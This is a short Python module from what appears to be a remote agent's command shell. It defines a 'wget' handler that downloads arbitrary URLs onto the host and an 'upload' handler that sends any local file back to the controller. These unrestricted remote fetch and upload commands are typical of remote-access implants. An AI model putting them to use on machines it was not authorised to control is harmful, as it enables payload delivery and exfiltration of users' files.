import wget
from agent.commandreturn import CommandReturn
from .. import errors
import requests
import uuid
import os
from ..shell import Shell
# wget URL [NEW_FILENANE]
def cmd_wget(shell, data):
    try:
        filename=wget.download(*data)
        return CommandReturn(errors.OK, filename)
    except Exception as err:
        return CommandReturn(errors.UNKNOWWN, str(err))


def cmd_upload(shell : Shell, data):
    path=data[0]
    filename=""
    if len(data)>1: filename=data[1]
    else:
        filename=os.path.basename(path)
    ret=shell.getAgent().sendFile(path, filename)
    return CommandReturn(ret["code"], ret["data"])

